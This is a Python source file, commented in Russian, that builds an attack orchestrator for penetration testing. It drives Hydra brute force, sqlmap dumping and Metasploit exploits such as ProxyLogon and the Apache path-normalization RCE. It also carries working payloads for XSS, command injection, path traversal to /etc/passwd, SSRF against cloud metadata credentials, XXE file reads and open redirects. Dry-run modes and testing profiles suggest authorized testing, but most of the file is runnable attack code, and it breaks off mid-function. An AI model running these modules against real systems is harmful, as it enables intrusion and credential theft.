from __future__ import annotations

import json
import logging
import os
import re
import shutil
import subprocess
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Set
from urllib.parse import urlencode, urlparse, urlunparse

import httpx

from src.core.events import BaseEvent


def _ensure_url(target: str) -> str:
    if target.startswith(("http://", "https://")):
        return target
    return f"http://{target}"


def _with_query(url: str, extra: Dict[str, str]) -> str:
    parsed = urlparse(url)
    query = urlencode(extra)
    return urlunparse(parsed._replace(query=query))


class AttackExecutionError(RuntimeError):
    """Базовое исключение модуля атак."""


class RecoverableAttackError(AttackExecutionError):
    """Исключение для временных ошибок (перезапуск через backoff)."""


class AttackVector(str, Enum):
    BRUTE_FORCE = "bruteforce"
    SQLI = "sqli"
    METASPLOIT = "metasploit"
    LEGACY_AUDIT = "legacy_audit"
    XSS_EXPLOIT = "xss_exploit"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    SSRF = "ssrf"
    SSTI = "ssti"
    XXE = "xxe"
    OPEN_REDIRECT = "open_redirect"
    CORS_MISCONFIG = "cors_misconfig"


class TestingModel(str, Enum):
    BLACK_BOX = "black_box"
    GREY_BOX = "grey_box"
    WHITE_BOX = "white_box"


@dataclass
class RetryPolicy:
    max_attempts: int = 3
    base_delay: float = 2.0
    max_delay: float = 30.0


@dataclass
class AttackProfile:
    mode: TestingModel
    allowed_vectors: Set[AttackVector]
    max_parallel: int
    rate_limit_per_minute: int
    description: str
    requires_credentials: bool = False
    dry_run_only: bool = False
    retry_policy: RetryPolicy = field(default_factory=RetryPolicy)


@dataclass
class AttackContext:
    event_id: str
    target: str
    vector: AttackVector
    profile: AttackProfile
    parameters: Dict[str, Any] = field(default_factory=dict)
    dry_run: bool = False
    sla: Optional[str] = None
    submitted_at: datetime = field(default_factory=datetime.utcnow)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def spawn_child(self, *, vector: Optional[AttackVector] = None, suffix: str = "", **extra_params) -> "AttackContext":
        """Создаёт дочерний контекст (например, для автозапуска эксплойтов)."""
        new_parameters = dict(self.parameters)
        new_parameters.update(extra_params)
        return AttackContext(
            event_id=f"{self.event_id}{suffix}",
            target=self.target,
            vector=vector or self.vector,
            profile=self.profile,
            parameters=new_parameters,
            dry_run=self.dry_run,
            sla=self.sla,
            submitted_at=self.submitted_at,
            metadata=dict(self.metadata),
        )


@dataclass
class AttackOutcome:
    success: bool
    status: str
    module: str
    details: str
    artifacts: Dict[str, Any] = field(default_factory=dict)
    evidence: Dict[str, Any] = field(default_factory=dict)
    attempts: int = 1
    duration_seconds: float = 0.0
    matched_vulns: List[Dict[str, Any]] = field(default_factory=list)


class AttackAuditTrail:
    """Логирование и сохранение артефактов каждой атаки."""

    def __init__(self, log_dir: Path, artifact_dir: Path):
        self.log_dir = Path(log_dir)
        self.artifact_dir = Path(artifact_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.artifact_dir.mkdir(parents=True, exist_ok=True)

        log_file = self.log_dir / "attack_engine.log"
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s",
            handlers=[
                logging.FileHandler(log_file, encoding="utf-8"),
                logging.StreamHandler(),
            ],
        )
        self.logger = logging.getLogger("attack-engine")
        self._lock = threading.Lock()

    def log_event(self, event_id: str, stage: str, payload: Dict[str, Any]) -> None:
        record = {
            "event_id": event_id,
            "stage": stage,
            "timestamp": datetime.utcnow().isoformat(),
            "payload": payload,
        }
        with self._lock:
            self.logger.info(json.dumps(record, ensure_ascii=False))

    def persist_artifact(self, event_id: str, name: str, content: Any) -> Path:
        event_dir = self.artifact_dir / event_id
        event_dir.mkdir(parents=True, exist_ok=True)
        file_path = event_dir / f"{name}.json"
        with file_path.open("w", encoding="utf-8") as fp:
            json.dump(content, fp, indent=2, ensure_ascii=False)
        return file_path


class LegacyVulnerabilityChecker:
    """Сопоставление баннеров/версий с CVE и рекомендациями по эксплойтам."""

    def __init__(self, signature_path: Path):
        self.signature_path = Path(signature_path)
        self.signature_path.parent.mkdir(parents=True, exist_ok=True)
        if not self.signature_path.exists():
            self._write_default_signatures()
        with self.signature_path.open("r", encoding="utf-8") as fp:
            self.signatures = json.load(fp)

    def match(self, banners: Iterable[str]) -> List[Dict[str, Any]]:
        matches: List[Dict[str, Any]] = []
        for banner in banners:
            normalized = banner.lower()
            for sig in self.signatures:
                pattern = sig.get("pattern", "").lower()
                if pattern and pattern in normalized:
                    matches.append(
                        {
                            "product": sig["product"],
                            "pattern": sig["pattern"],
                            "cves": sig.get("cves", []),
                            "metasploit_module": sig.get("metasploit_module"),
                            "severity": sig.get("severity", "medium"),
                            "notes": sig.get("notes", ""),
                        }
                    )
        return matches

    def _write_default_signatures(self) -> None:
        defaults = [
            {
                "product": "Apache HTTP Server",
                "pattern": "Apache/2.4.49",
                "cves": ["CVE-2021-41773", "CVE-2021-42013"],
                "metasploit_module": "exploit/multi/http/apache_normalize_path",
                "severity": "critical",
                "notes": "Уязвимость обхода путей и RCE.",
            },
            {
                "product": "Microsoft Exchange",
                "pattern": "X-OWA-Version: 15.0.1497.2",
                "cves": ["CVE-2021-26855"],
                "metasploit_module": "exploit/exchange/proxylogon_rce",
                "severity": "critical",
                "notes": "ProxyLogon цепочка.",
            },
            {
                "product": "OpenSSH",
                "pattern": "OpenSSH_7.2p2",
                "cves": ["CVE-2016-0777"],
                "metasploit_module": None,
                "severity": "high",
                "notes": "Слабая реализация roaming.",
            },
        ]
        with self.signature_path.open("w", encoding="utf-8") as fp:
            json.dump(defaults, fp, indent=2, ensure_ascii=False)


class BaseAttackModule:
    module_name: str = "base"
    description: str = ""
    supports_dry_run: bool = True

    def execute(self, context: AttackContext) -> AttackOutcome:
        raise NotImplementedError


class BruteforceModule(BaseAttackModule):
    module_name = "hydra_bruteforce"
    description = "Брутфорс учётных записей через Hydra/кастомные словари."

    def __init__(self, dictionary_dir: Path):
        self.dictionary_dir = Path(dictionary_dir)
        self.dictionary_dir.mkdir(parents=True, exist_ok=True)
        self.hydra_binary = shutil.which("hydra")
        self._ensure_wordlists()

    def execute(self, context: AttackContext) -> AttackOutcome:
        service = context.parameters.get("service", "ssh")
        port = context.parameters.get("port", 22 if service == "ssh" else None)
        userlist = context.parameters.get("userlist") or str(self.dictionary_dir / "users.txt")
        passlist = context.parameters.get("passlist") or str(self.dictionary_dir / "passwords.txt")
        rate_limit = context.parameters.get("rate_limit", 4)

        command = [
            self.hydra_binary or "hydra",
            "-L",
            userlist,
            "-P",
            passlist,
            "-t",
            str(rate_limit),
        ]
        if port:
            command.extend(["-s", str(port)])
        command.append(f"{service}://{context.target}")

        if context.dry_run or not self.hydra_binary:
            status = "dry_run" if context.dry_run else "simulated"
            details = "Команда сформирована, выполнение не запускалось."
            return AttackOutcome(
                success=True,
                status=status,
                module=self.module_name,
                details=details,
                artifacts={"command": " ".join(command)},
            )

        start = time.time()
        proc = subprocess.run(
            command,
            capture_output=True,
            text=True,
            check=False,
        )
        duration = time.time() - start
        success = proc.returncode == 0
        details = "Hydra завершилась успешно" if success else f"Hydra завершилась с кодом {proc.returncode}"
        artifacts = {
            "command": " ".join(command),
            "stdout": proc.stdout[-2048:],
            "stderr": proc.stderr[-2048:],
        }
        evidence = {}
        if "login:" in proc.stdout:
            evidence["credentials"] = [
                line.strip()
                for line in proc.stdout.splitlines()
                if "login:" in line.lower()
            ]

        return AttackOutcome(
            success=success,
            status="completed" if success else "failed",
            module=self.module_name,
            details=details,
            artifacts=artifacts,
            evidence=evidence,
            duration_seconds=duration,
        )

    def _ensure_wordlists(self) -> None:
        defaults = {
            "users.txt": ["admin", "root", "test"],
            "passwords.txt": ["admin123", "P@ssw0rd", "qwerty"],
            "domains.txt": ["corp.local", "intranet.local"],
        }
        for name, entries in defaults.items():
            file_path = self.dictionary_dir / name
            if not file_path.exists():
                file_path.write_text("\n".join(entries), encoding="utf-8")


class SqlmapModule(BaseAttackModule):
    module_name = "sqlmap_runner"
    description = "Интеграция sqlmap CLI/API для автоматизации SQL-инъекций."

    def __init__(self):
        self.sqlmap_binary = shutil.which("sqlmap") or shutil.which("sqlmap.py")

    def execute(self, context: AttackContext) -> AttackOutcome:
        url = context.parameters.get("url") or context.target
        level = int(context.parameters.get("level", 2))
        risk = int(context.parameters.get("risk", 1))
        command = [
            self.sqlmap_binary or "sqlmap",
            "-u",
            url,
            "--batch",
            f"--level={level}",
            f"--risk={risk}",
            "--random-agent",
        ]

        if context.parameters.get("dump"):
            command.append("--dump")
        if headers := context.parameters.get("headers"):
            for header, value in headers.items():
                command.extend(["--header", f"{header}: {value}"])

        if context.dry_run or not self.sqlmap_binary:
            status = "dry_run" if context.dry_run else "simulated"
            details = "sqlmap не запускался (dry-run или бинарь отсутствует)."
            return AttackOutcome(
                success=True,
                status=status,
                module=self.module_name,
                details=details,
                artifacts={"command": " ".join(command)},
            )

        start = time.time()
        proc = subprocess.run(
            command,
            capture_output=True,
            text=True,
            check=False,
        )
        duration = time.time() - start
        success = proc.returncode == 0
        details = "sqlmap завершился успешно" if success else f"sqlmap завершился с кодом {proc.returncode}"

        artifacts = {
            "command": " ".join(command),
            "stdout": proc.stdout[-4096:],
            "stderr": proc.stderr[-4096:],
        }

        findings = []
        for line in proc.stdout.splitlines():
            if "[INFO]" in line or "[CRITICAL]" in line:
                findings.append(line.strip())

        evidence = {"findings": findings[-20:]}

        return AttackOutcome(
            success=success,
            status="completed" if success else "failed",
            module=self.module_name,
            details=details,
            artifacts=artifacts,
            evidence=evidence,
            duration_seconds=duration,
        )


class MetasploitModule(BaseAttackModule):
    module_name = "metasploit_rpc"
    description = "Запуск шаблонов эксплойтов через Metasploit RPC."

    def __init__(self):
        self.rpc_url = os.getenv("MSFRPC_URL", "http://127.0.0.1:55553/api/")
        self.api_token = os.getenv("MSFRPC_TOKEN")
        self.username = os.getenv("MSFRPC_USER")
        self.password = os.getenv("MSFRPC_PASS")
        self._client: Optional[httpx.Client] = None

    def _client_ready(self) -> bool:
        return bool(self.api_token or (self.username and self.password))

    def _call_rpc(self, method: str, params: Dict[str, Any]) -> Dict[str, Any]:
        if self._client is None:
            self._client = httpx.Client(timeout=10)
        payload = {"method": method, "params": params}
        response = self._client.post(self.rpc_url, json=payload)
        response.raise_for_status()
        return response.json()

    def execute(self, context: AttackContext) -> AttackOutcome:
        module = context.parameters.get("module", "exploit/multi/http/apache_normalize_path")
        options = context.parameters.get("options", {})
        options.setdefault("RHOSTS", context.target)
        if "RPORT" not in options and "port" in context.parameters:
            options["RPORT"] = context.parameters["port"]

        artifacts = {
            "module": module,
            "options": options,
        }

        if context.dry_run:
            return AttackOutcome(
                success=True,
                status="dry_run",
                module=self.module_name,
                details="Metasploit задача не запускалась (dry-run).",
                artifacts=artifacts,
            )

        if not self._client_ready():
            details = "MSFRPC не настроен, выполнена симуляция."
            return AttackOutcome(
                success=True,
                status="simulated",
                module=self.module_name,
                details=details,
                artifacts=artifacts,
            )

        try:
            response = self._call_rpc(
                "module.execute",
                {
                    "token": self.api_token,
                    "module_type": module.split("/")[0],
                    "module_name": "/".join(module.split("/")[1:]),
                    "options": options,
                },
            )
        except httpx.RequestError as exc:
            raise RecoverableAttackError(f"MSFRPC недоступен: {exc}") from exc
        except httpx.HTTPStatusError as exc:
            raise AttackExecutionError(f"MSFRPC вернул ошибку: {exc}") from exc

        artifacts["response"] = response
        success = response.get("job_id") is not None
        details = "Эксплойт поставлен в очередь" if success else "Metasploit ответил без job_id"

        return AttackOutcome(
            success=success,
            status="completed" if success else "failed",
            module=self.module_name,
            details=details,
            artifacts=artifacts,
        )


class LegacyAuditModule(BaseAttackModule):
    module_name = "legacy_version_audit"
    description = "Проверка баннеров/версий и рекомендации по CVE/эксплойтам."

    def __init__(self, checker: LegacyVulnerabilityChecker):
        self.checker = checker

    def execute(self, context: AttackContext) -> AttackOutcome:
        banners: List[str] = context.parameters.get("banners") or []
        if not banners:
            raise AttackExecutionError("Для legacy_audit необходимо передать список баннеров.")

        matched = self.checker.match(banners)
        details = f"Найдено совпадений: {len(matched)}"
        status = "completed" if matched else "no_findings"

        return AttackOutcome(
            success=True,
            status=status,
            module=self.module_name,
            details=details,
            matched_vulns=matched,
        )


class XssExploitModule(BaseAttackModule):
    module_name = "xss_exploit"
    description = "Эксплуатация отражённого XSS: инъекция набора payload'ов в параметр и проверка отражения."

    DEFAULT_PAYLOADS = [
        "<script>alert(document.domain)</script>",
        "\"><svg onload=alert(document.domain)>",
        "'><img src=x onerror=alert(document.domain)>",
        "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    ]

    def execute(self, context: AttackContext) -> AttackOutcome:
        url = _ensure_url(context.parameters.get("url") or context.target)
        param = context.parameters.get("param", "q")
        payloads = context.parameters.get("payloads") or self.DEFAULT_PAYLOADS

        if context.dry_run:
            return AttackOutcome(
                success=True,
                status="dry_run",
                module=self.module_name,
                details=f"Подготовлено {len(payloads)} XSS payload'ов для параметра '{param}'.",
                artifacts={"url": url, "param": param, "payloads": payloads},
            )

        confirmed: List[Dict[str, Any]] = []
        for payload in payloads:
            probe_url = _with_query(url, {param: payload})
            try:
                response = httpx.get(probe_url, timeout=10)
            except httpx.RequestError:
                continue
            if payload in response.text:
                confirmed.append({"payload": payload, "url": probe_url, "status_code": response.status_code})

        success = bool(confirmed)
        details = (
            f"Подтверждено {len(confirmed)} из {len(payloads)} payload'ов для параметра '{param}'."
            if success
            else f"Отражённый XSS не подтверждён для параметра '{param}'."
        )

        return AttackOutcome(
            success=success,
            status="completed" if success else "no_findings",
            module=self.module_name,
            details=details,
            artifacts={"url": url, "param": param, "tested": len(payloads)},
            evidence={"confirmed_payloads": confirmed},
        )


class CommandInjectionModule(BaseAttackModule):
    module_name = "command_injection"
    description = "Проверка и эксплуатация ОС command injection через output- и time-based payload'ы."

    OUTPUT_PAYLOADS = [";id", "|id", "`id`", "$(id)", ";whoami", "|whoami"]
    TIME_PAYLOADS = [";sleep 5", "|sleep 5", "`sleep 5`", "$(sleep 5)"]
    OUTPUT_PATTERNS = [r"uid=\d+\(\w*\)\s+gid=\d+", r"root:.*:0:0", r"\b(www-data|root|daemon)\b"]

    def execute(self, context: AttackContext) -> AttackOutcome:
        url = _ensure_url(context.parameters.get("url") or context.target)
        param = context.parameters.get("param", "cmd")
        baseline_delay = float(context.parameters.get("baseline_delay", 5.0))

        if context.dry_run:
            return AttackOutcome(
                success=True,
                status="dry_run",
                module=self.module_name,
                details=f"Подготовлены payload'ы command injection для параметра '{param}'.",
                artifacts={
                    "url": url,
                    "param": param,
                    "output_payloads": self.OUTPUT_PAYLOADS,
                    "time_payloads": self.TIME_PAYLOADS,
                },
            )

        confirmed_output: List[Dict[str, Any]] = []
        for payload in self.OUTPUT_PAYLOADS:
            probe_url = _with_query(url, {param: payload})
            try:
                response = httpx.get(probe_url, timeout=10)
            except httpx.RequestError:
                continue
            for pattern in self.OUTPUT_PATTERNS:
                if re.search(pattern, response.text):
                    confirmed_output.append({"payload": payload, "url": probe_url, "pattern": pattern})
                    break

        confirmed_time: List[Dict[str, Any]] = []
        for payload in self.TIME_PAYLOADS:
            probe_url = _with_query(url, {param: payload})
            start = time.time()
            try:
                httpx.get(probe_url, timeout=baseline_delay + 5)
            except httpx.TimeoutException:
                confirmed_time.append({"payload": payload, "url": probe_url, "note": "превышен таймаут — возможна инъекция"})
                continue
            except httpx.RequestError:
                continue
            elapsed = time.time() - start
            if elapsed >= baseline_delay:
                confirmed_time.append({"payload": payload, "url": probe_url, "elapsed_seconds": elapsed})

        success = bool(confirmed_output or confirmed_time)
        details = (
            f"Найдено {len(confirmed_output)} output-based и {len(confirmed_time)} time-based признаков инъекции."
            if success
            else f"Command injection не подтверждена для параметра '{param}'."
        )

        return AttackOutcome(
            success=success,
            status="completed" if success else "no_findings",
            module=self.module_name,
            details=details,
            artifacts={"url": url, "param": param},
            evidence={"output_based": confirmed_output, "time_based": confirmed_time},
        )


class PathTraversalModule(BaseAttackModule):
    module_name = "path_traversal"
    description = "Эксплуатация Path Traversal/LFI: перебор payload'ов для чтения файлов через параметр."

    TRAVERSAL_PREFIXES = ["../", "..\\", "%2e%2e%2f", "..%2f", "....//"]
    MAX_DEPTH = 6
    SIGNATURES = {
        "etc/passwd": r"root:.*:0:0",
        "win.ini": r"\[fonts\]",
    }

    def execute(self, context: AttackContext) -> AttackOutcome:
        url = _ensure_url(context.parameters.get("url") or context.target)
        param = context.parameters.get("param", "file")
        target_file = context.parameters.get("file", "etc/passwd")
        payloads = context.parameters.get("payloads") or self._build_payloads(target_file)

        if context.dry_run:
            return AttackOutcome(
                success=True,
                status="dry_run",
                module=self.module_name,
                details=f"Подготовлено {len(payloads)} payload'ов traversal для параметра '{param}' (файл: {target_file}).",
                artifacts={"url": url, "param": param, "file": target_file, "payloads": payloads[:10]},
            )

        signature = self._signature_for(target_file)
        confirmed: List[Dict[str, Any]] = []
        for payload in payloads:
            probe_url = _with_query(url, {param: payload})
            try:
                response = httpx.get(probe_url, timeout=10)
            except httpx.RequestError:
                continue
            if signature and re.search(signature, response.text):
                confirmed.append({"payload": payload, "url": probe_url, "status_code": response.status_code})

        success = bool(confirmed)
        details = (
            f"Подтверждено чтение файла '{target_file}' через {len(confirmed)} payload'ов."
            if success
            else f"Path traversal не подтверждён для файла '{target_file}'."
        )

        return AttackOutcome(
            success=success,
            status="completed" if success else "no_findings",
            module=self.module_name,
            details=details,
            artifacts={"url": url, "param": param, "file": target_file, "tested": len(payloads)},
            evidence={"confirmed_payloads": confirmed},
        )

    def _build_payloads(self, target_file: str) -> List[str]:
        payloads = []
        for prefix in self.TRAVERSAL_PREFIXES:
            for depth in range(2, self.MAX_DEPTH + 1):
                payloads.append(prefix * depth + target_file)
        return payloads

    def _signature_for(self, target_file: str) -> Optional[str]:
        for key, signature in self.SIGNATURES.items():
            if key in target_file.replace("\\", "/"):
                return signature
        return None


class SsrfModule(BaseAttackModule):
    module_name = "ssrf_probe"
    description = "Server-Side Request Forgery: подстановка внутренних/служебных адресов в параметр запроса."

    DEFAULT_PARAM = "url"
    DEFAULT_TARGETS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ]
    SIGNATURES = [
        (r"169\.254\.169\.254", r"(ami-id|instance-id|iam|security-credentials)"),
        (r"127\.0\.0\.1|localhost", r"(<html|<title|server)"),
    ]

    def execute(self, context: AttackContext) -> AttackOutcome:
        url = _ensure_url(context.parameters.get("url") or context.target)
        param = context.parameters.get("param", self.DEFAULT_PARAM)
        targets = context.parameters.get("targets") or self.DEFAULT_TARGETS

        if context.dry_run:
            return AttackOutcome(
                success=True,
                status="dry_run",
                module=self.module_name,
                details=f"Подготовлено {len(targets)} SSRF-целей для параметра '{param}'.",
                artifacts={"url": url, "param": param, "targets": targets},
            )

        confirmed: List[Dict[str, Any]] = []
        for ssrf_target in targets:
            probe_url = _with_query(url, {param: ssrf_target})
            try:
                response = httpx.get(probe_url, timeout=10)
            except httpx.RequestError:
                continue
            for target_pattern, body_pattern in self.SIGNATURES:
                if re.search(target_pattern, ssrf_target) and re.search(body_pattern, response.text, re.IGNORECASE):
                    confirmed.append({"target": ssrf_target, "url": probe_url, "status_code": response.status_code})
                    break

        success = bool(confirmed)
        details = (
            f"Подтверждён SSRF через {len(confirmed)} из {len(targets)} целей для параметра '{param}'."
            if success
            else f"SSRF не подтверждён для параметра '{param}'."
        )

        return AttackOutcome(
            success=success,
            status="completed" if success else "no_findings",
            module=self.module_name,
            details=details,
            artifacts={"url": url, "param": param, "tested": len(targets)},
            evidence={"confirmed_targets": confirmed},
        )


class SstiModule(BaseAttackModule):
    module_name = "ssti_exploit"
    description = "Server-Side Template Injection: проверка вычисления выражений в шаблонизаторе."

    PROBES = {
        "{{7*7}}": "49",
        "${7*7}": "49",
        "#{7*7}": "49",
        "<%= 7*7 %>": "49",
        "${{7*7}}": "49",
        "@(7*7)": "49",
    }

    def execute(self, context: AttackContext) -> AttackOutcome:
        url = _ensure_url(context.parameters.get("url") or context.target)
        param = context.parameters.get("param", "name")
        payloads = context.parameters.get("payloads") or list(self.PROBES.keys())

        if context.dry_run:
            return AttackOutcome(
                success=True,
                status="dry_run",
                module=self.module_name,
                details=f"Подготовлено {len(payloads)} SSTI-проб для параметра '{param}'.",
                artifacts={"url": url, "param": param, "payloads": payloads},
            )

        confirmed: List[Dict[str, Any]] = []
        for payload in payloads:
            expected = self.PROBES.get(payload, "49")
            probe_url = _with_query(url, {param: payload})
            try:
                response = httpx.get(probe_url, timeout=10)
            except httpx.RequestError:
                continue
            if expected in response.text and payload not in response.text:
                confirmed.append({"payload": payload, "url": probe_url, "evaluated": expected})

        success = bool(confirmed)
        details = (
            f"Подтверждена SSTI через {len(confirmed)} payload'ов для параметра '{param}'."
            if success
            else f"SSTI не подтверждена для параметра '{param}'."
        )

        return AttackOutcome(
            success=success,
            status="completed" if success else "no_findings",
            module=self.module_name,
            details=details,
            artifacts={"url": url, "param": param, "tested": len(payloads)},
            evidence={"confirmed_payloads": confirmed},
        )


class XxeModule(BaseAttackModule):
    module_name = "xxe_injection"
    description = "XML External Entity: отправка XML с внешней сущностью для чтения локальных файлов."

    SIGNATURES = {"etc/passwd": r"root:.*:0:0", "win.ini": r"\[fonts\]"}
    DEFAULT_PAYLOAD_TEMPLATE = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///{file}">]>'
        "<root>&xxe;</root>"
    )

    def execute(self, context: AttackContext) -> AttackOutcome:
        url = _ensure_url(context.parameters.get("url") or context.target)
        target_file = context.parameters.get("file", "etc/passwd")
        content_type = context.parameters.get("content_type", "application/xml")
        payload = context.parameters.get("payload") or self.DEFAULT_PAYLOAD_TEMPLATE.format(file=target_file)

        if context.dry_run:
            return AttackOutcome(
                success=True,
                status="dry_run",
                module=self.module_name,
                details=f"Подготовлен XXE payload для файла '{target_file}'.",
                artifacts={"url": url, "file": target_file, "payload": payload},
            )

        signature = self._signature_for(target_file)
        try:
            response = httpx.post(url, content=payload, headers={"Content-Type": content_type}, timeout=10)
        except httpx.RequestError as exc:
            raise RecoverableAttackError(f"XXE запрос не выполнен: {exc}") from exc

        success = bool(signature and re.search(signature, response.text))
        details = (
            f"Подтверждено чтение файла '{target_file}' через XXE."
            if success
            else f"XXE не подтверждён для файла '{target_file}'."
        )

        return AttackOutcome(
            success=success,
            status="completed" if success else "no_findings",
            module=self.module_name,
            details=details,
            artifacts={"url": url, "file": target_file, "status_code": response.status_code},
            evidence={"response_snippet": response.text[:500]},
        )

    def _signature_for(self, target_file: str) -> Optional[str]:
        for key, signature in self.SIGNATURES.items():
            if key in target_file.replace("\\", "/"):
                return signature
        return None


class OpenRedirectModule(BaseAttackModule):
    module_name = "open_redirect"
    description = "Open Redirect: проверка перенаправления на сторонний домен через типовые параметры."

    DEFAULT_PARAMS = ["redirect", "url", "next", "return", "dest", "continue", "redir", "out"]
    DEFAULT_PAYLOAD = "https://evil.example.com"

    def execute(self, context: AttackContext) -> AttackOutcome:
        url = _ensure_url(context.parameters.get("url") or context.target)
        params = context.parameters.get("params") or self.DEFAULT_PARAMS
        payload = context.parameters.get("payload", self.DEFAULT_PAYLOAD)

        if context.dry_run:
            return AttackOutcome(
                success=True,
                status="dry_run",
                module=self.module_name,
                details=f"Подготовлено {len(params)} параметров для проверки open redirect.",
                artifacts={"url": url, "params": params, "payload": payload},
            )

        confirmed: List[Dict[str, Any]] = []
        for param in params:
            probe_url = _with_query(url, {param: payload})
            try:
                response = httpx.get(probe_url, timeout=10, follow_redirects=False)
            except httpx.RequestError:
                continue
            location = response.headers.get("location", "")
            if response.status_code in (301, 302, 303, 307, 308) and payload in location:
                confirmed.append(
                    {"param": param, "url": probe_url, "location": location, "status_code": response.status_code}
                )

        success = bool(confirmed)
        details = (
            f"Open redirect подтверждён для параметров: {', '.join(item['param'] for item in confirmed)}."
            if success
            else "Open redirect не подтверждён."
        )

        return AttackOutcome(
            success=success,
            status="completed" if success else "no_findings",
            module=self.module_name,
            details=details,
            artifacts={"url": url, "tested": len(params), "payload": payload},
            evidence={"confirmed_params": confirmed},
        )


class CorsMisconfigModule(BaseAttackModule):
    module_name = "cors_misconfig"
    description = "Проверка CORS-конфигурации: отражение произвольного Origin с разрешением credentials."

    DEFAULT_ORIGIN = "https://evil-attacker.example"

    def execute(self, context: AttackContext) -> AttackOutcome:
        url = _ensure_url(context.parameters.get("url") or context.target)
        origin = context.parameters.get("origin", self.DEFAULT_ORIGIN)

        if context.dry_run:
            return AttackOutcome(
                success=True,
                status="dry_run",
                module=self.module_name,
                details=f"Будет отправлен запрос с заголовком Origin: {origin}.",
                artifacts={"url": url, "origin": origin},
            )

        try:
            response = httpx.get(url, headers={"Origin": origin}, timeout=10)
        except httpx.RequestError as exc:
            raise RecoverableAttackError(f"CORS запрос не выполнен: {exc}") from exc

        acao = response.headers.get("access-control-allow-origin", "")
        acac = response.headers.get("access-control-allow-credentials", "").lower()
        success = (acao == origin or acao == "*") and acac == "true"

        details = (
            f"CORS misconfiguration: Access-Control-Allow-Origin='{acao}', Access-Control-Allow-Credentials='{acac}'."
            if success
            else f"CORS заголовки не указывают на уязвимость (ACAO='{acao}', ACAC='{acac}')."
        )

        return AttackOutcome(
            success=success,
            status="completed" if success else "no_findings",
            module=self.module_name,
            details=details,
            artifacts={"url": url, "origin": origin, "status_code": response.status_code},
            evidence={"access_control_allow_origin": acao, "access_control_allow_credentials": acac},
        )


class AttackOrchestrator:
    """Высокоуровневый оркестратор атак Dev B."""

    def __init__(
        self,
        *,
        dictionary_dir: Path = Path("data/wordlists"),
        artifacts_dir: Path = Path("artifacts/attack_runs"),
        logs_dir: Path = Path("logs"),
    ):
        self.audit = AttackAuditTrail(logs_dir, artifacts_dir)
        self.vuln_checker = LegacyVulnerabilityChecker(Path("data/vuln_signatures.json"))
        self.brute_module = BruteforceModule(dictionary_dir)
        self.sqli_module = SqlmapModule()
        self.meta_module = MetasploitModule()
        self.legacy_module = LegacyAuditModule(self.vuln_checker)
        self.xss_module = XssExploitModule()
        self.cmdi_module = CommandInjectionModule()
        self.path_traversal_module = PathTraversalModule()
        self.ssrf_module = SsrfModule()
        self.ssti_module = SstiModule()
        self.xxe_module = XxeModule()
        self.open_redirect_module = OpenRedirectModule()
        self.cors_module = CorsMisconfigModule()

        self.modules: Dict[AttackVector, BaseAttackModule] = {
            AttackVector.BRUTE_FORCE: self.brute_module,
            AttackVector.SQLI: self.sqli_module,
            AttackVector.METASPLOIT: self.meta_module,
            AttackVector.LEGACY_AUDIT: self.legacy_module,
            AttackVector.XSS_EXPLOIT: self.xss_module,
            AttackVector.COMMAND_INJECTION: self.cmdi_module,
            AttackVector.PATH_TRAVERSAL: self.path_traversal_module,
            AttackVector.SSRF: self.ssrf_module,
            AttackVector.SSTI: self.ssti_module,
            AttackVector.XXE: self.xxe_module,
            AttackVector.OPEN_REDIRECT: self.open_redirect_module,
            AttackVector.CORS_MISCONFIG: self.cors_module,
        }

        self.profiles = self._build_profiles()
        self.history: Dict[str, Dict[str, Any]] = {}
        self.cancellations: Set[str] = set()
        self._lock = threading.Lock()

    def _build_profiles(self) -> Dict[TestingModel, AttackProfile]:
        return {
            TestingModel.BLACK_BOX: AttackProfile(
                mode=TestingModel.BLACK_BOX,
                allowed_vectors={
                    AttackVector.BRUTE_FORCE,
                    AttackVector.SQLI,
                    AttackVector.LEGACY_AUDIT,
                    AttackVector.XSS_EXPLOIT,
                    AttackVector.COMMAND_INJECTION,
                    AttackVector.PATH_TRAVERSAL,
                    AttackVector.SSRF,
                    AttackVector.SSTI,
                    AttackVector.XXE,
                    AttackVector.OPEN_REDIRECT,
                    AttackVector.CORS_MISCONFIG,
                },
                max_parallel=2,
                rate_limit_per_minute=30,
                description="Без доступа к исходникам/учёткам, минимальные знания цели.",
            ),
            TestingModel.GREY_BOX: AttackProfile(
                mode=TestingModel.GREY_BOX,
                allowed_vectors=set(AttackVector),
                max_parallel=5,
                rate_limit_per_minute=60,
                description="Частичный доступ и знания.",
                requires_credentials=True,
            ),
            TestingModel.WHITE_BOX: AttackProfile(
                mode=TestingModel.WHITE_BOX,
                allowed_vectors=set(AttackVector),
                max_parallel=10,
                rate_limit_per_minute=120,
                description="Полный доступ к исходникам и окружению.",
            ),
        }

    def cancel_attack(self, event_id: str) -> None:
        self.cancellations.add(event_id)

    def list_modules(self) -> List[Dict[str, Any]]:
        return [
            {
                "vector": vector.value,
                "module": module.module_name,
                "description": module.description,
                "supports_dry_run": module.supports_dry_run,
            }
            for vector, module in self.modules.items()
        ]

    def execute_attack(
        self,
        attack_type: str,
        target: str,
        *,
        parameters: Optional[Dict[str, Any]] = None,
        profile: TestingModel = TestingModel.BLACK_BOX,
        dry_run: bool = False,
        sla: Optional[str] = None,
    ) -> BaseEvent:
        vector = AttackVector(attack_type)
        profile_obj = self.profiles[profile]
        if vector not in profile_obj.allowed_vectors:
            raise ValueError(f"Вектор {vector.value} запрещён для профиля {profile.value}")

        parameters = parameters or {}
        event_id = f"atk_{vector.value}_{uuid.uuid4().hex[:8]}"
        context = AttackContext(
            event_id=event_id,
            target=target,
            vector=vector,
            profile=profile_obj,
            parameters=parameters,
            dry_run=dry_run or profile_obj.dry_run_only,
            sla=sla,
        )

        banners = parameters.get("banners") or []
        matched_vulns = self.vuln_checker.match(banners) if banners else []
        context.metadata["matched_vulns"] = matched_vulns

        module = self.modules[vector]
        outcome = self._run_with_retry(module, context, profile_obj.retry_policy)

